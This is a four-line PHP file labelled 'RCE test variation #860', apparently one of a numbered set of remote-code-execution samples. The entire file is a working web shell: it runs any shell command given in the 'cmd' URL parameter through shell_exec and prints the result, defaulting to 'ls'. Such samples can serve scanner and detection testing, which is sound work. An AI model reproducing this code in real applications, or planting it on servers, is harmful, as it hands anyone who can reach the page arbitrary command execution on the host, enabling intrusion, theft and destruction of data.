<?php
// RCE test variation #860
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>